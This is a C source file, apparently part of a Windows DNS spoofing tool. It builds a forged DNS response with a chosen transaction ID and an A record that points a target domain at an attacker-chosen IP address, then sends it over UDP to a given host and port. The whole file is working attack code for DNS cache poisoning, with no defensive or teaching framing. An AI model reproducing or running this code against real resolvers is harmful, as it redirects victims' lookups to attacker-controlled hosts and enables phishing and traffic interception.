#include "DNSClient.h"

char* prepare_dns_packet(char* spoofDomain, int spoofDomainLen, int* packetLen, unsigned short transId, char spoofIP[])
{
	int labelsCount = count_labels(spoofDomain);
	char** domainLabels = extract_labels(spoofDomain, labelsCount);

	int len = spoofDomainLen + 34;
	*packetLen = len;
	char* returnedBuffer = (char*)malloc(sizeof(char) * len);

	if (!returnedBuffer) return 0;

	*((unsigned short*)returnedBuffer) = transId;
	returnedBuffer[2] = 0x81;
	returnedBuffer[3] = 0x80;

	// questions
	returnedBuffer[4] = 0x0;
	returnedBuffer[5] = 0x1;

	// answer rrs
	returnedBuffer[6] = 0x0;
	returnedBuffer[7] = 0x1;

	// authority rrs
	returnedBuffer[8] = 0x0;
	returnedBuffer[9] = 0x0;

	// addtional rrs
	returnedBuffer[10] = 0x0;
	returnedBuffer[11] = 0x0;

	// domain parts
	int lastLenCopied = 12;
	int domainOffset = lastLenCopied;
	for (int i = 0; i < labelsCount; i++)
	{
		returnedBuffer[lastLenCopied] = strlen(domainLabels[i]);
		lastLenCopied++;
		for (int j = 0; j < strlen(domainLabels[i]); j++)
		{
			returnedBuffer[lastLenCopied + j] = (unsigned char)domainLabels[i][j];
		}
		lastLenCopied += strlen(domainLabels[i]);
	}

	// null character
	returnedBuffer[lastLenCopied] = 0x00;
	lastLenCopied++;

	// Type: A
	returnedBuffer[lastLenCopied] = 0x00;
	lastLenCopied++;
	returnedBuffer[lastLenCopied] = 0x01;
	lastLenCopied++;

	// Class: IN
	returnedBuffer[lastLenCopied] = 0x00;
	lastLenCopied++;
	returnedBuffer[lastLenCopied] = 0x01;
	lastLenCopied++;

	// Answers Sections
	// Name section
	returnedBuffer[lastLenCopied] = 0xc0;
	lastLenCopied++;
	returnedBuffer[lastLenCopied] = (unsigned char)domainOffset;
	lastLenCopied++;

	returnedBuffer[lastLenCopied] = 0x00;
	lastLenCopied++;
	returnedBuffer[lastLenCopied] = 0x01;
	lastLenCopied++;

	returnedBuffer[lastLenCopied] = 0x00;
	lastLenCopied++;
	returnedBuffer[lastLenCopied] = 0x01;
	lastLenCopied++;

	// number of seconds to live for the dns cache
	returnedBuffer[lastLenCopied] = 0x00;
	lastLenCopied++;
	returnedBuffer[lastLenCopied] = 0x00;
	lastLenCopied++;
	returnedBuffer[lastLenCopied] = 0x03;
	lastLenCopied++;
	returnedBuffer[lastLenCopied] = 0x2a;
	lastLenCopied++;

	// RData section (IP Address)
	returnedBuffer[lastLenCopied] = 0x0;
	lastLenCopied++;
	returnedBuffer[lastLenCopied] = 0x4;
	lastLenCopied++;
	returnedBuffer[lastLenCopied] = spoofIP[0];
	lastLenCopied++;
	returnedBuffer[lastLenCopied] = spoofIP[1];
	lastLenCopied++;
	returnedBuffer[lastLenCopied] = spoofIP[2];
	lastLenCopied++;
	returnedBuffer[lastLenCopied] = spoofIP[3];

	return returnedBuffer;
}

int send_dns_packet(char* packet, int len, int port, char ip[4]) {
	WSAData wsaData;

	int result = WSAStartup(MAKEWORD(2, 2), &wsaData);

	if (result != 0) {
		printf("while initliazing winsock2 api: %d\n", WSAGetLastError());
		return -1;
	}

	int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

	if (sock == INVALID_SOCKET) {
		printf("while creating dns socket: %d\n", WSAGetLastError());
		return -1;
	}

	struct sockaddr_in addr = {};

	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.S_un.S_un_b.s_b1 = ip[0];
	addr.sin_addr.S_un.S_un_b.s_b2 = ip[1];
	addr.sin_addr.S_un.S_un_b.s_b3 = ip[2];
	addr.sin_addr.S_un.S_un_b.s_b4 = ip[3];

	// ISSUE: OS will pick up random port to send the data from
	result = sendto(sock, packet, len, 0, (struct sockaddr*)&addr, sizeof(addr));

	closesocket(sock);

	WSACleanup();

	return 1;
}
